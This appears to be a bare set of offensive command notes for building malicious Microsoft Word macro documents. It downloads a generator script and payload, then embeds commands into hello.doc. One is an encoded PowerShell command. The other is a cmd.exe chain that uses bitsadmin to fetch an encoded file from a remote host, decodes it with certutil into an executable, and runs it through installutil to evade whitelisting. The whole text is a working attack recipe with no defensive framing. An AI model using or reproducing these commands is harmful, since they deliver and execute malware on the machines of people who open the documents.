```bash
wget https://raw.githubusercontent.com/GooseGusevich/Codes/refs/heads/main/Macros%20Microsoft%20Word/Generate.py
```
```bash
wget https://raw.githubusercontent.com/GooseGusevich/Codes/refs/heads/main/Macros%20Microsoft%20Word/payload.txt
```


```bash
python3 Generate.py hello.doc 100 'powershell -enc <base64>'
```
```bash
python3 Generate.py hello.doc 100 'cmd.exe /c "del /f /q C:\Windows\Tasks\enc.txt 2>nul & del /f /q C:\Windows\Tasks\a.exe 2>nul & bitsadmin /Transfer theJob http://192.168.45.152/PSRunspace-InvokeRun-certutilCoded.txt C:\Windows\Tasks\enc.txt & certutil -decode C:\Windows\Tasks\enc.txt C:\Windows\Tasks\a.exe & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\a.exe"'
```
